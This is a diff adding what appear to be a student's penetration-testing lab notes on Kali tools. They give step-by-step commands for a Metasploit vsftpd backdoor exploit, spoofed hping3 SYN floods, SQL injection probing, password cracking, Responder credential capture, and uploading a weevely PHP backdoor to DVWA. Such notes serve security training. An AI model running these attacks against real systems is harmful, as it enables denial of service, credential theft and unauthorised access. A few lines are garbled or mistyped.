@@ -1,0 +1,260 @@
+PROGRAM 1 : Information Gathering Tools
+
+NMAP :
+It is developed in such a way that it can quickly analyze massive networks as well as single hosts. Network administrators often use it to detect the devices that are presently working on the system, the port number to which the devices are attached, and the free ports that may be used.
+Some of the tasks that nmap can carry out are-
+
+Discovering connected hosts on a network
+Analyzing free ports on a target host
+Detecting running services on a system along with version number
+Uncovering network vulnerabilities and system loopholes
+
+
+nmap -sV 10.0.2.15 (This searches for open ports on that IP)
+metasploit (Open metasploit to search for vulnerabilities on that open port)
+search vstpd 2.3.4 (This is the version number that you obtained from running first command)
+use exploit/unix/ftp/vstpd_234_backdoor (in the matches found from step3, choose the one which matches with the version in step3, and then specify its path)
+set RHOSTS 10.0.2.5 (This step involves specifying the target host)
+exploit (This command just starts exploiting the specified target host)
+
+HPING3 :
+hping3 is a network tool able to send custom ICMP/UDP/TCP packets and to display target replies like ping does with ICMP replies. It handles fragmentation and arbitrary packet body and size, and can be used to transfer files under supported protocols. Using hping3, you can test firewall rules, perform (spoofed) port scanning, test network performance using different protocols, do path MTU discovery, perform traceroute-like actions under different protocols, fingerprint remote operating systems, audit TCP/IP stacks
+
+Syntax to perform attack from a particular IP : 
+hping3 -S (DestinationIP) -a (SourceIP) -p (PortNumber) --flood
+Example : hping3 -S 10.0.2.15 -a 192.192.192.192 -p 80 –flood
+Syntax to perform attack from random IP :
+hping3 -S (DestinationIP) -d (Length) -p (PortNumber) --flood --rand-source
+Example : hping3 -S 10.0.2.15 -d 74 -p 80 --flood --rand-source
+Once the command is executed, open WireShark to view the flooding of network packets
+
+PROGRAM 2 : Web Application Analysis Tools
+
+Webscarab :
+
+Browse a vulnerable website by typing : ?php=id (? shows whether vulnerable or not. )
+Once you find a website, type ‘ next to its URL. If it is vulnerable, you’ll get syntax error, if not, just redirects to the website normally
+Open terminal, type webscarab
+In Proxy->Listeners, IP default is 127.0.0.1 and Port is 8008. We need to apply this to our browser. Go to firefox and Manually enter this proxy in settings.
+??????? (lmao same)
+
+HTTrack : 
+
+Install httrack : sudo apt-get install httrack webhttrack
+To mirror a site : httrack www.someweb.com/bob/
+To mirror two sites with shared links and accept any jpg files on .com sites : httrack www.someweb.com/bob/ www.anothertest.com/mike/ +*.com/*.jpg -mime:application/*
+To get all files starting from bobby.html with 6-link depth : httrack www.someweb.com/bob/bobby.html +* -r6
+To run on spider using a proxy : httrack www.someweb.com/bob/bobby.html --spider -P proxy.myhost.com:8080
+To update mirror in current folder : httrack --update
+Using HTTrack GUI :
+Syntax : webhttrack 
+Create a project 
+Add the URL
+Site is mirrored
+
+PROGRAM 3 : Password Attack Tools
+
+John The Ripper :
+John the Ripper (JtR) is a password cracking tool originally produced for UNIX-based systems. It was designed to test password strength, brute-force encrypted (hashed) passwords, and crack passwords via dictionary attacks.
+
+JOHN uses 3 modes :
+Single Crack Mode : 
+Go to an online SHA1 encryption website and type in a word and get the encryption
+Copy it into a “file.txt” in Kali (Should be in the username:password format)
+john --single --format=raw-sha1 file.txt 
+      2.	Wordlist Crack Mode : 
+Can use inbuilt dictionary “password.lst” or custom ones.
+john --wordlist=/usr/share/john/password.lst --format=raw-sha1 crack.txt 
+     3.	Incremental Mode : john --incremental file.txt
+
+
+
+Crunch :
+Crunch is a wordlist generating tool that comes pre-installed with Kali Linux. It is used to generate custom keywords based on wordlists. It generates a wordlist with permutation and combination. We could use some specific patterns and symbols to generate a wordlist. 
+
+To create a wordlist of specific numbers : crunch 1 2 0123456789 
+To save the wordlist to a file :
+crunch 1 2 0123456789 >wordlist.txt
+crunch 1 2 0123456789 -o wordlist.txt
+To generate a file using rainbow charset file : 
+crunch 2 3 /usr/share/rainbowcrack/charset.txt 
+To generate a wordlist with a specific pattern : crunch 10 10 -t manav^%%%% 
+, for all uppercase letters
+@ for all lowercase letters
+% for all numeric characters
+^ for all special characters
+To generate a wordlist with a permutation : crunch 1 10 -p Hello Manav
+
+PROGRAM 4 : Sniffing and Spoofing Tools
+
+MACChanger :
+MAC Changer is an utility that makes the manipulation of MAC addresses of network interfaces easier. MAC addresses are unique identifiers on networks, they only need to be unique, they can be changed on most network hardware. 
+Features:
+set specific MAC address of a network interface
+set the MAC randomly
+set a MAC of another vendor
+set another MAC of the same vendor
+set a MAC of the same kind (eg: wireless card)
+display a vendor MAC list (today, 6200 items) to choose from
+
+Turn off the network interface before MAC can be changed : ifconfig eth0 down
+To change MAC Address with MACchanger type : macchanger -m b2:aa:0e:56:ed:f7 eth0
+To set a fully random MAC : macchanger -r eth0
+To not change the vendor bytes : macchanger -e eth0
+To reset MAC to original, permanent address : macchanger -p eth0
+Turn on the network interface when done with changes : ifconfig eth0 up
+
+Responder : 
+Responder is an inbuilt Kali Linux tool for Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) that responds to specific NetBIOS queries based on the file server request.
+
+responder -I eth0 -wbF (w-WPAD server, b-basic HTTP authentication, F-force authentication for WAPD server)
+Change network adapter settings from NAT to Bridged Adaptor (to establish same subnet for Kali and your DNS server)
+Check IP of your machine : ifconfig
+Run the responder command : responder -I eth0 (starts listening for events)
+Go to quick access on Windows, and type in the IP (example : \\192.168.0.163)
+Type in your username and password and it’ll get captured by the Responder tool
+Similarly, typing the IP in the Windows machine web browser, authentication details will be asked.
+
+PROGRAM 5 : Exploitation Tools
+
+Weevely :
+
+type weevely in terminal to see different usage options
+Now we use weevely to create a backdoor in Desktop : weevely generate skyvenom agent.php (This created a backdoor called “agent.php” with password “skyvenom” )
+Now to setup a metasploitable machine : 
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA
+Rename the DVWA folder to dvwa : sudo mv DVWA dvwa
+Set read, write, and execute permissions to the DVWA directory : chmod -R 777 dvwa/
+Set up the user and password required to access the database : 
+cd dvwa/config
+sudo cp config.inc.php.dist config.inc.php
+sudo nano config.inc.php 
+Set db_user as user and db_password as pass. Save changes
+Install MySQL : 
+sudo apt install default-mysql-server
+sudo service mysql start
+systemctl status mysql
+sudo mysql -u root -p
+create user 'user'@'127.0.0.1' identified by 'pass';
+grant all privileges on dvwa.* to 'user'@'127.0.0.1' identified by 'pass'; Next, type “exit” to close the database.
+Install PHP : 
+sudo apt update
+sudo apt install php7.4 -y
+Configure Apache server :
+cd /etc/php/7.4/apache2
+sudo nano php.ini
+Scroll down and look for these two lines: allow_url_fopen and allow_url_include. Set them both as On. Save the file.
+sudo service apache2 start
+Open the DVWA through web browser : http://127.0.0.1/dvwa/index.php
+Go to security and set it as “Low”
+Go to “File Upload” and upload “agent.php” there.
+weevely http://127.0.0.1/dvwa/hackable/uploads/agent.php skyvenom
+Type pwd 
+Type system_info to check system information
+Type net_ifconfig to find IP of target system along with port
+To remove file from target machine : file_rm <filename>
+To download file from machine into our system : file_download <sourcepath> <destination path>
+
+Proxychain : 
+
+Install proxychains : sudo apt-get install proxychains
+Install tor : sudo apt-get install tor
+Check the status of tor : sudo service tor status
+If it is not active, activate it : sudo service tor start
+Check status again to confirm it is active
+Next step is to change proxyserver mode from “Strict mode” to “Dynamic mode”. Open the /etc/proxychains4.conf file. Next, comment “Strict mode” and “Random chain” and uncomment “Dynamic mode”. 
+Also, uncomment “proxy_dns” to increase anonymity.
+Add socks5 IP at the end. Save changes and proceed. 
+Restart the tor service : service tor restart
+Next, try opening firefox but load bing.com within in : proxychains firefox www.bing.com
+Last, go to https://www.dnsleaktest.com/ you can see different location each time you refresh the tor status and launch proxychains.
+
+
+
+
+
+PROGRAM 6 : Forensics Tools
+
+Foremost :
+Foremost is a forensic program to recover lost files based on their headers, footers, and internal data structures.
+Foremost can work on image files, such as those generated by dd, Safeback, Encase, etc, or directly on a drive. The headers and footers can be specified by a configuration file or you can use command line switches to specify built-in file types. These built-in types look at the data structures of a given file format allowing for a more reliable and faster recovery.
+
+
+Install foremost : sudo apt-get install foremost
+Search for USB device paths : fdisk -l
+Copy one of the paths (example : /dev/sda1)
+There are many options for recovery :
+-t : Specify type of file to recover :
+For single file type : foremost -t jpg
+For multiple file types : foremost -t jpg,pdf,exe
+For all file types : foremost -t all
+-q : To enable quick mode 
+-v : To enable verbose mode. Print details of files being recovered
+-Q : To enable quiet mode. No info printed on terminal
+-i : To specify disk location
+-o : To specify output location where info being recovered will be stored
+
+To recover all files with verbose and quick mode : foremost -v -q -t all -i /dev/sda1 -o recoveredFiles
+
+Binwalk : 
+Binwalk is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images.
+
+Install binwalk : sudo apt-get install binwalk 
+There are different ways of recovery :
+Scanning Firmware 
+Syntax : binwalk firmware.bin / binwalk -B firmware (Signature scanning)
+File Extraction
+Extract files from firmware(-e,--extract) : binwalk -e firmware.bin
+Extract files from firmware recursively(-M) : binwalk -Me firmware.bin
+Extract specific signature types(-D) : binwalk -D ‘png image:png’ firmware.bin
+Extract undetected files(-r) : binwalk -Mre firmware.bin
+Entropy Analysis 
+Low entropy : encryption mechanisms may not be implemented
+High entropy : availability of an encryption mechanism
+Syntax : binwalk -E firmware.bin
+Generating differences between firmware images : binwalk -W firmware1.bin firmware2.bin
+Capturing Log files : binwalk -f file.log firmware.bin
+To display CPU architecture : binwalk --disasm firmware.bin
+
+
+PROGRAM 7 : Reporting Tools
+
+Pipal :
+All this tool does is to give you the stats and the information to help you analyse the passwords. The real work is done by you in interpreting the results.
+
+Install pipal : sudo apt-get install pipal
+Download a file containing passwords : passwords.txt
+To show top results (-t or –top) : pipal -t 10 passwords.txt
+To store output in another file (-o or –output) : pipal -t 10 -o results.txt passwords.txt
+To show available checkers which are enabled : pipal --list-checkers
+
+Cutycapt :
+CutyCapt is a small cross-platform command-line utility to capture WebKit’s rendering of a web page into a variety of vector and bitmap formats, including SVG, PDF, PS, PNG, JPEG, TIFF, GIF, and BMP.
+
+Install cutycapt : sudo apt-get install cutycapt
+To screenshot a website and store as png : cutycapt --url=http://www.example.org/ --out=localfile.png
+
+PROGRAM 8 : Additional Innovative Tools
+
+Metagoofil :
+Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) belonging to a target company.
+Metagoofil will perform a search in Google to identify and download the documents to the local disk. 
+
+Install metagoofil : sudo apt-get install metagoofil
+Example : metagoofil -d apple.com -l 100 -n 50 -t pdf,jpg -f appleinfo.html -o applerecovery
+-d : Domain to search
+-l : limit of data to be searched
+-n : limit of files to be downloaded
+-t : type of file to be downloaded
+-f : format in which to store the gathered info
+-o : File in which all recovery info will be stored
+Netdiscover :
+Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without dhcp server, when you are wardriving. It can be also used on hub/switched networks.
+Built on top of libnet and libpcap, it can passively detect online hosts, or search for them, by actively sending ARP requests.
+Netdiscover can also be used to inspect your network ARP traffic, or find network addresses using auto scan mode, which will scan for common local networks.
+
+Install netdiscover : sudo apt install netdiscover
+Search for your IP address and device type : ifconfig 
+Example : netdiscover -i eth0 -r 192.168.16.0/24 
+
